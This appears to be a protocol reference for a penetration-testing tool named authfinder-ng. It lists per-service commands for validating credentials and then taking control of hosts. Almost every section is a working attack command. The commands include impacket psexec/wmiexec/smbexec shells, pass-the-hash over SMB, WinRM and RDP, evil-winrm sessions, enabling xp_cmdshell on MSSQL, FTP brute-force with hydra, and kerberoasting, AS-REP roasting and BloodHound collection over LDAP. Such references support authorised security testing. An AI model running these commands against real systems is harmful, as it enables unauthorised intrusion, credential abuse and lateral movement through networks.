# Protocol Reference

Per-protocol usage notes, default ports, and manual commands for `authfinder-ng`.

---

## SMB (Port 445)

**Requirements:** None for auth check. Local Admin for `Pwn3d!` / RCE.

```bash
# Auth check
authfinder-ng TARGET -u admin -p pass --tools smb

# Manual equivalent
nxc smb TARGET -u 'admin' -p 'pass' -d 'DOMAIN'

# After Pwn3d! — interactive shell
impacket-wmiexec 'DOMAIN/admin':'pass'@TARGET
impacket-psexec  'DOMAIN/admin':'pass'@TARGET
impacket-smbexec 'DOMAIN/admin':'pass'@TARGET

# Pass-the-hash
nxc smb TARGET -u 'admin' -H 'NTHASH'
impacket-wmiexec -hashes :NTHASH 'DOMAIN/admin'@TARGET
```

**Success indicators:** `[+]` = valid creds | `[Pwn3d!]` = local admin

---

## WinRM (Port 5985 / 5986)

**Requirements:** User must be in `Remote Management Users` or `Administrators`.

```bash
# Auth check + command execution
authfinder-ng TARGET -u admin -p pass --tools winrm

# Manual equivalent
nxc winrm TARGET -u 'admin' -p 'pass' -x 'whoami /all'

# Interactive shell (evil-winrm)
evil-winrm -i TARGET -u 'admin' -p 'pass'
evil-winrm -i TARGET -u 'admin' -H 'NTHASH'

# Non-standard port (auto-detected by authfinder-ng)
evil-winrm -i TARGET -u 'admin' -p 'pass' -P 55985
nxc winrm TARGET --port 55985 -u 'admin' -p 'pass'
```

---

## WMI / DCOM (Port 135)

**Requirements:** Local Admin required for execution.

```bash
authfinder-ng TARGET -u admin -p pass --tools wmi

# Manual
nxc wmi TARGET -u 'admin' -p 'pass' -x 'whoami /all'
impacket-wmiexec 'DOMAIN/admin':'pass'@TARGET 'whoami /all'
```

---

## RDP (Port 3389)

**Requirements:** User in `Remote Desktop Users` or `Administrators`.

```bash
authfinder-ng TARGET -u admin -p pass --tools rdp

# Auth check only (no GUI)
nxc rdp TARGET -u 'admin' -p 'pass'

# Desktop connection
xfreerdp3 /v:TARGET /u:'admin' /p:'pass' /cert:ignore /dynamic-resolution +clipboard

# Pass-the-hash (Restricted Admin Mode must be enabled on target)
xfreerdp3 /v:TARGET /u:'admin' /pth:NTHASH /cert:ignore /dynamic-resolution +clipboard

# Non-standard port
xfreerdp3 /v:TARGET:33389 /u:'admin' /p:'pass' /cert:ignore /dynamic-resolution +clipboard
```

---

## MSSQL (Port 1433)

**Requirements:** Valid SQL/Windows auth credentials. Sysadmin for `xp_cmdshell`.

```bash
authfinder-ng TARGET -u sa -p pass --tools mssql

# Manual auth check
nxc mssql TARGET -u 'sa' -p 'pass'

# Check sysadmin
nxc mssql TARGET -u 'sa' -p 'pass' -q "SELECT IS_SRVROLEMEMBER('sysadmin')"

# Interactive
impacket-mssqlclient 'sa':'pass'@TARGET -windows-auth

# In mssqlclient:
# enable_xp_cmdshell
# xp_cmdshell whoami /all
# DISABLE AFTER: exec sp_configure 'xp_cmdshell',0; RECONFIGURE
```

---

## SSH (Port 22)

**Requirements:** Valid credentials. No hash support.

```bash
# Linux target
authfinder-ng TARGET -u root -p pass --linux

# Windows target with SSH
authfinder-ng TARGET -u admin -p pass --tools ssh

# Manual
nxc ssh TARGET -u 'user' -p 'pass' -x 'id'
ssh user@TARGET -p 22

# Non-standard port (auto-detected by authfinder-ng via rustscan)
nxc ssh TARGET --port 2222 -u 'user' -p 'pass'
ssh user@TARGET -p 2222
```

---

## FTP (Port 21)

**Requirements:** Valid credentials or anonymous access.

```bash
authfinder-ng TARGET -u ftpuser -p pass --tools ftp

# Anonymous check (done automatically by authfinder-ng)
nxc ftp TARGET -u 'anonymous' -p 'anonymous@'

# Manual
nxc ftp TARGET -u 'user' -p 'pass'
hydra -l 'user' -p 'pass' ftp://TARGET
```

---

## LDAP (Port 389 / 636)

**Requirements:** Valid domain credentials.

```bash
authfinder-ng TARGET -u jsmith -p pass -d CORP.LOCAL --tools ldap

# Manual
nxc ldap TARGET -u 'jsmith' -p 'pass' -d 'CORP.LOCAL'

# Anonymous bind check (done automatically)
ldapsearch -x -H ldap://TARGET -b '' -s base namingContexts

# Enumeration after auth
nxc ldap TARGET -u 'jsmith' -p 'pass' --kerberoasting kerberoast.txt
nxc ldap TARGET -u 'jsmith' -p 'pass' --asreproast asrep.txt
nxc ldap TARGET -u 'jsmith' -p 'pass' --bloodhound -c All
```

---

## Non-Standard Port Examples

`authfinder-ng` handles these automatically. For manual use:

| Service | Default | Non-standard | Tool flag |
|---------|---------|-------------|-----------|
| WinRM HTTP | 5985 | 55985 | `nxc winrm TARGET --port 55985` |
| WinRM HTTPS | 5986 | 55986 | `nxc winrm TARGET --port 55986 --ssl` |
| RDP | 3389 | 33389 | `xfreerdp3 /v:TARGET:33389` |
| SSH | 22 | 2222 | `nxc ssh TARGET --port 2222` |
| MSSQL | 1433 | 1435 | `nxc mssql TARGET --port 1435` |
| evil-winrm | 5985 | 55985 | `evil-winrm -i TARGET -P 55985` |
